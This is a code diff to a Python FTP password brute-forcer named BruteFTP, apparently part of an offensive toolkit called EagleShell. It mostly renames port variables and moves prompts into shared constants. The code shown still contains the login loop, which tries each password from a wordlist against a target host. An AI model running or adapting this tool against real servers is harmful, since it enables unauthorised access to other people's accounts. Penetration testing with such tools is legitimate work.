@@ -3,7 +3,7 @@
 from assets.banners import bruteftp_banner
 from assets.colors import *
 from assets.designs import logo, author
-from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, wordlist_prefix, unable_to_connect_prefix
+from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, wordlist_prefix, unable_to_connect_prefix, user_prefix, rport_prefix, threads_prefix
 from assets.properties import clear_screen
 from assets.shortcuts import Exit
 from .brute_force import BruteForce
@@ -17,7 +17,7 @@ class BruteFTP:
     def __init__(self):
         self.host_set = ''
         self.user_set = ''
-        self.port_set = ''
+        self.rport_set = ''
         self.n_threads = 10
         self.password_found = ''
         self.password_tried = 0
@@ -34,12 +34,13 @@ class BruteFTP:
 
     def configuration(self):
         try:
+            self.header()
             print('Configuration:')
             print('\n\tRHOST Input')
             print('\tExample: 10.10.10.15\n')
             print('\n\tUser Input:')
             print('\tExample: admin\n')
-            print('\n\tPort Input')
+            print('\n\tRPORT Input')
             print('\tExample: 21\n')
             print('\n\tThreads Input')
             print('\tExample: 10\n')
@@ -54,17 +55,17 @@ class BruteFTP:
                     BruteForce()
                 elif self.host_set == 'x':
                     Exit()
-                self.user_set = input('\u001b[33mUSER \u001b[37m> ')
+                self.user_set = input(user_prefix)
                 if self.user_set == 'z' or self.user_set == 'Z':
                     BruteForce()
                 elif self.user_set == 'x' or self.user_set == 'X':
                     Exit()
-                self.port_set = input('\u001b[33mPORT \u001b[37m> ').lower()
-                if self.port_set == 'z':
+                self.rport_set = input(rport_prefix).lower()
+                if self.rport_set == 'z':
                     BruteForce()
-                elif self.port_set == 'x':
+                elif self.rport_set == 'x':
                     Exit()
-                self.threads_set = input('\u001b[33mTHREADS \u001b[37m> ').lower()
+                self.threads_set = input(threads_prefix).lower()
                 self.n_threads = self.threads_set
                 if self.threads_set == 'z':
                     BruteForce()
@@ -75,6 +76,7 @@ class BruteFTP:
                     BruteForce()
                 elif self.wordlist_set == 'x' or self.wordlist_set == 'X':
                     Exit()
+                break
         except ValueError:
             print('\t' + unable_to_connect_prefix)
             os.system('sleep 1')
@@ -114,7 +116,7 @@ class BruteFTP:
                 self.password_tried = self.password_tried + 1
                 print('\tPASSWORDS TRIED: ' + str(self.password_tried), end='\r')
                 try:
-                    server.connect(self.host_set, int(self.port_set), timeout=5)
+                    server.connect(self.host_set, int(self.rport_set), timeout=5)
                     server.login(self.user_set, password)
                 except ftplib.error_perm:
                     pass
